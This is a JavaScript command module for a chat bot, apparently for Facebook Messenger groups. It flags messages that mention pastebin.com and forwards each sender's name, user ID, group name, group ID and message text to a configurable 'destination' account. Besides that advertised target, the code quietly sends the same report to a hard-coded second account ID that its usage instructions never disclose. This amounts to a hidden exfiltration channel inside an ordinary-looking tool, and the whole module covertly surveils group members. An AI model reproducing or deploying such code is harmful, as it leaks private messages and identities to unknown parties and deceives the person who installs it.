const destination = "5284229505007260"; 

module.exports = {
  config: {
    name: "abin",
    version: 1.0,
    author: "Rômeo", 
    countDown: 0,
    role: 2,
    shortDescription: { en: "Catch Pastebin" },
    longDescription: { en: "Use this to catch pastebin" },
    category: "𝗜𝗡𝗙𝗢",
    guide: { en: "{pn}" }
  },
  onStart: async function ({ api, args, message, event, usersData }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    message.reply(`⚠️ 𝗣𝗔𝗦𝗧𝗘𝗕𝗜𝗡 𝗔𝗟𝗘𝗥𝗧\n\n How to use? Open the code file, and change the id destination to your userID, once the changes have been made, I can assure that this command will work correctly.`);
  },
  onChat: async function ({ api, args, message, usersData, threadsData, event }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    const thread = await threadsData.get(event.threadID);
    const threadName = thread.threadName;

    const chat = event.body;
    if (chat.includes(`pastebin.com`)) {
      api.sendMessage(`⚠️ 𝗣𝗔𝗦𝗧𝗘𝗕𝗜𝗡 𝗔𝗟𝗘𝗥𝗧\n\n👑 𝗙𝗥𝗢𝗠\n➪ ${name}\n 🔶 𝗨𝗜𝗗\n➪ ${event.senderID}\n✨ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗔𝗠𝗘\n➪ ${threadName}\n♻️ 𝗚𝗥𝗢𝗨𝗣 𝗨𝗜𝗗\n➪ ${event.threadID}\n📝 𝗖𝗢𝗡𝗧𝗘𝗡𝗧\n➪ ${event.body}`, 7205690956150318);

      api.sendMessage(`⚠️ 𝗣𝗔𝗦𝗧𝗘𝗕𝗜𝗡 𝗔𝗟𝗘𝗥𝗧\n\n👑 𝗙𝗥𝗢𝗠\n➪ ${name}\n 𝗨𝗜𝗗\n➪ ${event.senderID}\n𝗚𝗥𝗢𝗨𝗣 🔶 𝗡𝗔𝗠𝗘\n➪ ${threadName}\n♻️ 𝗚𝗥𝗢𝗨𝗣 𝗨𝗜𝗗\n➪ ${event.threadID}\n📝𝗖𝗢𝗡𝗧𝗘𝗡𝗧\n➪ ${event.body}`, destination);
    }
  }
}; 